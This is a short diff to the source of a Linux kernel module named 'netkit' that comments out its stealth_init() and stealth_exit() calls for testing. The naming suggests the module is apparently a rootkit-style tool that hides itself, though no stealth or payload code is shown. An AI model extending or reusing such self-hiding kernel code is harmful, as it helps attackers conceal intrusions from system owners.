@@ -20,7 +20,7 @@ static int __init netkit_init(void)
     // if fails, directly exit module
     netkit_module = THIS_MODULE;
 
-    retv = stealth_init();
+    // testing: retv = stealth_init();
     if (retv < 0)
     {
         pr_err("[!] failed to start stealth (err: %d)\n", retv);
@@ -39,7 +39,7 @@ static void __exit netkit_exit(void)
     pr_err("[*] stopping module...\n");
 
     io_exit();
-    stealth_exit();
+    //testing: stealth_exit();
 }
 
 module_init(netkit_init);
